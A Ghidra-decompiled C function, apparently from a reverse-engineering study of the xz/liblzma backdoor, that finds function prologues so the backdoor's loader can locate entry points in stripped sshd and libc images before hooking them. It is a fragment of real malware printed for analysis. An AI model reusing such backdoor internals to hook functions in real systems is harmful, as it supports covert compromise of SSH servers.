// /home/kali/xzre-ghidra/xzregh/100B10_find_function_prologue.c
// Function: find_function_prologue @ 0x100B10
// Calling convention: unknown
// Prototype: undefined find_function_prologue(void)


/*
 * AutoDoc: Sweeps backward from a code pointer looking for a plausible function prologue based on decoded instruction patterns. The runtime loader uses it to recover entry points in stripped sshd/libc images before installing hooks.
 */
#include "xzre_types.h"


undefined8 find_function_prologue(ulong param_1,undefined8 param_2,ulong *param_3,int param_4)

{
  int iVar1;
  undefined8 uVar2;
  long lVar3;
  long *plVar4;
  long local_70;
  long local_68;
  int local_48;
  
  if (param_4 == 0) {
    uVar2 = 0;
    plVar4 = &local_70;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)plVar4 = 0;
      plVar4 = (long *)((long)plVar4 + 4);
    }
    iVar1 = x86_dasm(&local_70,param_1,param_2);
    if (((iVar1 != 0) && (local_48 == 3999)) && ((local_68 + local_70 & 0xfU) == 0)) {
      if (param_3 != (ulong *)0x0) {
        *param_3 = local_68 + local_70;
      }
      uVar2 = 1;
    }
  }
  else {
    uVar2 = is_endbr64_instruction(param_1,param_2,0xe230);
    if ((int)uVar2 != 0) {
      if (param_3 != (ulong *)0x0) {
        *param_3 = param_1;
      }
      uVar2 = 1;
    }
  }
  return uVar2;
}

